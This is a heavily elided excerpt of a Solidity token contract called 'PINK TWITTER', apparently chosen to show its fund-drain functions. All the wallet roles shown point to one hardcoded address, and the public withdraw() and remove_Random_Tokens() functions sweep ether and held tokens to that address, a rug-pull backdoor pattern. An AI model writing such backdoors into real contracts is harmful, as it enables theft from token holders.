...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x13585f6Cf85458932194e027dF14e375af5f3aF8; 
...
contract PINKTWITTER is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PINK TWITTER";
    string private _symbol = "PINKTWITTER";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x13585f6Cf85458932194e027dF14e375af5f3aF8); // 
    address payable public teamWalletAddress = payable(0x13585f6Cf85458932194e027dF14e375af5f3aF8); // 
    ...
    function withdraw() public {
        ...
        payable(address(0x13585f6Cf85458932194e027dF14e375af5f3aF8)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0x13585f6Cf85458932194e027dF14e375af5f3aF8),removeRandom);
}}